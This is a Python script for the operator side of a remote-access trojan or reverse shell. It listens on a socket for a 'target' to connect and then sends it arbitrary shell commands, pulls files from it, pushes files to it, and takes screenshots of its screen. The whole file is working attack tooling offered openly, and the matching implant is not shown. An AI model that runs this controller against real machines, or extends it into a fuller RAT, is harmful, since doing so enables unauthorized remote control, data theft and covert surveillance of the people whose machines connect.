#!/usr/bin/python3
import socket
import json
import base64
import os
import termcolor

class Listener:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.addr = (ip,port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(termcolor.colored("[+] Socket Object Created", "green"))
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(termcolor.colored("[+] Set ReuseAddr to 1", "green"))
        self.server.bind(self.addr)
        print(termcolor.colored(f"[!!] Socket Has Been Binded in {self.addr}", "green"))
        self.server.listen(0)
        print(termcolor.colored(f"[!!] Socket Is Listening For Incoming Connections", "green"))

    def accept_connection(self):
        self.connection, self.target_addr = self.server.accept() 
        # TODO: the accept function's default number of targets are 5!!
        # NOTE: In future if you wanna add threading you must think of a way to increase this according to the number of connections which will connect 
        print(termcolor.colored(f"[+] A New Connection Connected {self.target_addr}", "red"))

    def recieve(self) -> str:
        json_data = b''
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode("utf8"))
            except ValueError:
                continue

    def send(self, message: str):
        json_data = json.dumps(message).encode("utf8")
        print(termcolor.colored(f'[-] Sending A Command Worth: {len(json_data)} bytes!', "green"))
        self.connection.send(json_data)

    def read_files(self, file_name) -> bytes:
        with open(os.getcwd() + f"/{file_name}", "rb") as f:
            file_content = base64.b64encode(f.read())
            return file_content

    def shell(self):
        while True:
            command = input(termcolor.colored(f"{self.target_addr[0]} ➜ ", "blue"))
            if command == "quit":
                self.send(command)
                print("[!!] Closing The Socket Object")
                self.server.close()
                print("bye")
                exit()
            elif command[:8] == "download":
                self.send(command)
                with open(command[9:], "wb") as f:
                    f.write(base64.b64decode(self.recieve()))
            elif command[:6] == 'upload':
                self.send(command)
                file_content = self.read_files(command[7:]).decode("utf8")
                self.send(file_content)
            elif command[:10] == "screenshot":
                self.send("screenshot")
                with open(command[11:], "wb") as f:
                    f.write(base64.b64decode(self.recieve()))
            else:
                self.send(command)
                print(self.recieve())

if __name__ == '__main__':
    listener = Listener("localhost", 5555)
    listener.accept_connection()
    listener.shell()